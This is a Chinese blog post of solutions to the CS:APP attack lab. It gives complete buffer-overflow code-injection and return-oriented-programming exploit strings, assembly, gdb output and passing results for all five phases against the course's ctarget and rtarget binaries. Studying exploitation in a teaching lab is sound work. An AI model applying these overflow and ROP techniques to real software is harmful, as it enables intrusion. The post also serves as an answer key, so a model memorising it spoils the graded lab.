# data lab

占坑

# bomb lab

占坑

# attack lab

先用 `objdump` 反汇编出汇编代码：

```sh
objdump -d ctarget > ctarget_assembly.txt
```


<!--more-->


## Part I: Code Injection Attacks

### phase 1

`ctarget` 的流程是先调用 `test` 函数，然后在 `test` 函数中调用 `getbuf` 函数输入字符串。phase 1 的要求是从 `getbuf` 函数返回时调用 `touch1` 函数，而不是回到 `test` 函数。

先看提供的代码：

```c
unsigned getbuf() {
  char buf[BUFFER_SIZE];
  Gets(buf);
  return 1;
}

void test() {
  int val;
  val = getbuf();
  printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

!![栈帧结构](https://blog.kkkstra.cn/usr/uploads/2023/07/1762792570.png)

当输入的字符串溢出时，就会覆盖到调用者栈帧最下面的返回地址。

再看反汇编 `getbuf` 和 `touch1` 的代码：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```

可见 `getbuf` 分配了大小为 40 字节的栈帧空间，以及 `touch1` 的地e址为 `0x4017c0` ，因此输入字符串前 40 字节任意，最后包含 `touch1` 的地址即可，**注意还要使用小端法表示数据**。

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40
```

结果：

```sh
$ ./hex2raw < phase1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
```

### phase 2

phase 2 不仅需要在从 `getbuf` 返回时调用 `touch2`，还需要在调用时传入参数 cookie，也就是需要向寄存器 `%rdi` 写入 cookie 的值。

由于需要传入参数，就不能简单的通过覆写返回地址来实现，根据提示，需要通过汇编指令代码来实现，并将返回地址指向这些代码的地址。因此，只需要将代码写入到 `%rsp` 处，并且将返回地址设置成 `%rsp` 的地址。同时，由于要调用 `touch2`，我们还需要将 `touch2` 的地址压栈。

先获取汇编指令：

```sh
$ cat phase2.s
movq  $0x59b997fa, %rdi
pushq $0x4017ec
ret
$ gcc -c phase2.s       
$ objdump -d phase2.o                      

phase2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret
```

再利用 gdb 寻找 `%rsp` 的地址：

```sh 
(gdb) break *0x4017ac
Breakpoint 1 at 0x4017ac: file buf.c, line 14.
(gdb) run -q
Starting program: /home/kkkstra/code/csapp/attacklab/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:14
14	buf.c: 没有那个文件或目录.
(gdb) info registers 
...
rsp            0x5561dc78          0x5561dc78
...
```

可以得到字符串为：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

运行结果：

```sh
$ ./hex2raw < phase2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

### phase 3

phase 3 的要求与 phase 2 类似，但是这次需要给 `touch3` 函数以字符串的形式传递 `cookie`，先看给定的代码：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
  char cbuf[110];
  /* Make position of check string unpredictable */
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
  vlevel = 3;
  /* Part of validation protocol */
  if (hexmatch(cookie, sval)) {
    printf("Touch3!: You called touch3(\"%s\")\n", sval);
    validate(3);
  } else {
    printf("Misfire: You called touch3(\"%s\")\n", sval);
    fail(3);
  }
  exit(0);
}
```

因此我们需要做的事情是：

1. 将 cookie 字符串转换为 16 进制
2. 将字符串写入栈空间，并将该地址送到 `%rdi` 中
3. 将 `touch3` 首地址压栈最后 `ret`

此外，从提示中：


> When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.

可知，不能将 cookie 字符串存储在 `getbuf` 的栈空间中，因此我们需要将其存储在其调用者 `test` 的栈空间中。

先通过 `man ascii` 查询 cookie 字符串的十六进制表示：

```
35 39 62 39 39 37 66 61 00
```

再根据上面栈帧的结构，计算出字符串保存的位置应该为 `0x5561dca8`，得到：

```assembly
movq  $0x5561dca8, %rdi
pushq $0x4018fa
ret
```

剩余步骤与 phase 2 类似，得到所求字符串为：

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
```

运行结果：

```sh
$ ./hex2raw < phase3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
```

## Part II: Return-Oriented Programming

第二部分与第一部分的不同之处在于：

1. 使用了栈随机化，因此无法定位注入代码的地址
2. 保存堆栈的内存被标记为不可执行，即使可以将程序计数器指向注入代码，也无法执行这些代码

但是，虽然我们不能执行注入的代码，但是我们可以执行程序中已有的指令。这里需要利用到特殊的指令序列，称为 gadget。gadget 是一系列以 `ret` 指令为结尾的指令序列，例如给出的示例代码：

```c
void setval_210(unsigned *p) {
  *p = 3347663060U;
}
```

反汇编后得到它的指令字节编码：

```assembly
0000000000400f15 <setval_210>:
400f15:  c7 07 d4 48 89 c7  movl  $0xc78948d4,(%rdi)
400f1b:  c3                 retq
```

这里，位于地址 `0x400f18` 的序列 `48 89 c7` 就是指令 `mov %rax ，%rdi` 的编码。

这部分实验所需要用到的 gadget 都在 farm.c 中，我们获取它的汇编指令：

```sh
$ gcc -c -Og farm.c
$ objdump -d farm.o > farm.d
```

同时将 rtarget 反汇编：

```sh
objdump -d rtarget > rtarget.d
```

### phase 4

这部分的要求与 phase 2 相同，根据提示：

> - You can do this attack with just two gadgets.
>
> - When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.

可知，需要一个 `popq` 指令将 cookie 存入某个寄存器中，再利用 movq 指令将 cookie 从该寄存器移动到 `%rdi` 中，最后调用 `touch2`。则栈帧的结构如下所示：

![phase 4 的栈帧结构](https://blog.kkkstra.cn/usr/uploads/2023/08/3353287711.png)

我们先找到需要的 gadget：

`popq %rax`：

```assembly
0000000000000036 <getval_280>:
  36:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  3b:	c3                   	ret
```

`movq %rax %rdi`：二选一即可

```assembly
000000000000000c <addval_273>:
   c:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  12:	c3                   	ret
000000000000002f <setval_426>:
  2f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  35:	c3                   	ret
```

由此得到字符串：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00 
```

运行结果：

```sh
$ ./hex2raw < phase4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

### phase 5

phase 5 的要求与 phase 3 相同，因此大体思路仍然是将 cookie 对应的字符串存在 `test` 的栈帧当中，并将 cookie 的地址作为参数传入到 `touch3` 当中。

不过由于栈随机化的影响，这次我们无法直接获取 cookie 的地址，这里想到用一个基准的栈指针 `%rsp` 进行定位，将其初始的地址存在某个寄存器中，再加上一个偏移量，最终得到 cookie 的地址。

但是会发现 write up 中并没有给我们提供 add 指令的编码，好在发现 farm 中提供了一个 `add_xy` 函数，可以利用它进行加法运算：

```assembly
0000000000000042 <add_xy>:
  42:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  46:	c3                   	ret
```

最终得到的栈帧结构如下图所示：

![phase 5 的栈帧结构](https://blog.kkkstra.cn/usr/uploads/2023/08/2578476909.png)

所求字符串为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61
00
```

运行结果：

```sh
$ ./hex2raw < phase5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

